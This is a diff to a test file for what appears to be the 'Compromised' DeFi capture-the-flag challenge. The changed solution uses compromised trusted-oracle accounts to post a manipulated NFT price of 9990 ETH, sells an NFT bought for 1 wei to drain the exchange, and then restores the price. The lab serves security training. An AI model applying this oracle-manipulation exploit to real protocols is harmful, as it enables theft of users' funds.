@@ -10,7 +10,7 @@ describe('Compromised challenge', function () {
 
   let deployer, attacker
 
-  const EXCHANGE_INITIAL_ETH_BALANCE = ethers.utils.parseEther('999') // was 9990 but I changed it to 999... not sure if that was typo
+  const EXCHANGE_INITIAL_ETH_BALANCE = ethers.utils.parseEther('9990')
   const INITIAL_NFT_PRICE = ethers.utils.parseEther('999')
 
   before(async function () {
@@ -123,8 +123,9 @@ describe('Compromised challenge', function () {
       .callStatic.buyOne({ value: 1 })
     await this.exchange.connect(attacker).buyOne({ value: 1 })
     //console.log('tokenId:', tokenId)
-    await this.oracle.connect(trustedOracle1).postPrice('DVNFT', initPrice)
-    await this.oracle.connect(trustedOracle2).postPrice('DVNFT', initPrice)
+    const input = ethers.utils.parseUnits('9990', 18)
+    await this.oracle.connect(trustedOracle1).postPrice('DVNFT', input)
+    await this.oracle.connect(trustedOracle2).postPrice('DVNFT', input)
     const finalPrice = await this.oracle
       .connect(trustedOracle1)
       .getMedianPrice('DVNFT')
@@ -133,6 +134,8 @@ describe('Compromised challenge', function () {
       .connect(attacker)
       .approve(this.exchange.address, tokenId)
     await this.exchange.connect(attacker).sellOne(tokenId)
+    await this.oracle.connect(trustedOracle1).postPrice('DVNFT', initPrice)
+    await this.oracle.connect(trustedOracle2).postPrice('DVNFT', initPrice)
   })
 
   after(async function () {
